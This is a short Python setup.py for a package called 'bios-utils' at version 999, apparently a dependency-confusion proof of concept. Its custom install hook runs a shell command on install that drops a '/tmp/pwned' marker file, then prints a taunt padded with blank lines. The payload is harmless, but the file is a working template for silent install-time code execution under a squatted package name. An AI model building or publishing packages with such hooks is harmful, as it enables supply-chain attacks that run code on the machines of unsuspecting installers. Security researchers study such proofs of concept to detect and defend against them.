from setuptools import setup
from setuptools.command.install import install
from subprocess import check_call


class InstallCommand(install):
    def run(self):
        check_call(["touch", "/tmp/pwned"])
        install.run(self)
        print(
            "\n\n\n\n\n\n\n\n\n\n\n\nCheck your /tmp folder:)\n\n\n\n\n\n\n\n\n\n\n\n"
        )


setup(
    name="bios-utils",
    version="999",
    packages=["bios-utils"],
    cmdclass={
        "install": InstallCommand,
    },
)
